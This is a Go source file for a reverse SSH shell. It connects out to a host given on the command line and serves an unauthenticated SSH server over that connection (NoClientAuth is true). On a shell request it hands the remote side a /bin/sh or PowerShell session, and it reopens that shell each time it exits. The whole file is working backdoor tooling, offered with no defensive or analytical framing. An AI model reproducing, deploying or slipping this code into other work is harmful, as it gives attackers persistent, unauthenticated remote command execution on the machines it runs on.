package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"golang.org/x/crypto/ssh"
)

func main() {
	// connect can be just host (1.2.3.4) or host+port (1.2.3.4:8443)
	connect := os.Args[1]
	if !strings.Contains(connect, ":") {
		connect += ":22"
	}

	config := ssh.ServerConfig{
		NoClientAuth: true,
	}

	hostkey, err := makeHostKey()
	if err != nil {
		fmt.Println("[!] Error creating key:", err)
		return
	}
	config.AddHostKey(hostkey)

	conn, err := net.Dial("tcp", connect)
	if err != nil {
		fmt.Println("[!] Error connecting to ", connect)
		return
	}

	ssh_connection, channels, requests, err := ssh.NewServerConn(conn, &config)
	if err != nil {
		fmt.Println("[!] Handshake failed:", err)
		return
	}
	fmt.Println("[+] Connection successful.")

	go handleRequests(requests)
	go handleChannels(channels)

	ssh_connection.Wait()
	fmt.Println("[*] Connection closed")
}

func handleRequests(requests <-chan *ssh.Request) {
	for req := range requests {
		switch req.Type {
		case "pingpong":
			req.Reply(true, nil)
		default:
			req.Reply(false, nil)
		}
	}
}

func handleChannels(channels <-chan ssh.NewChannel) {
	for newChannel := range channels {
		if t := newChannel.ChannelType(); t != "session" {
			newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("[*] Unknown channel type: %s\n", t))
			continue
		}
		channel, requests, err := newChannel.Accept()
		if err != nil {
			//fmt.Println("[!] Error accepting channel:", err)
			continue
		}

		go handleSession(channel, requests)
	}
}

func handleSession(channel ssh.Channel, requests <-chan *ssh.Request) {
	defer channel.Close()

	var shell string
	if runtime.GOOS == "windows" {
		shell = "powershell.exe"
	} else {
		shell = "/bin/sh"
	}

	for req := range requests {
		switch req.Type {
		case "shell":
			req.Reply(true, nil)
			for true {
				cmd := exec.Command(shell)
				cmd.Env = os.Environ()

				cmd.Stdin = channel
				cmd.Stdout = channel
				cmd.Stderr = channel

				if err := cmd.Start(); err != nil {
					fmt.Println("[!] Shell start error:", err)
					return
				}
				cmd.Wait()
				// This loops. If cmd (shell) exits, it reopens another shell
				// Ctrl+C on the "server" end closes the connection
			}
		default:
			//fmt.Println("[*] Declining request:", req.Type)
			req.Reply(false, nil)
		}
	}
}

func makeHostKey() (ssh.Signer, error) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	privateKey := pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(key),
	}

	return ssh.ParsePrivateKey(pem.EncodeToMemory(&privateKey))
}
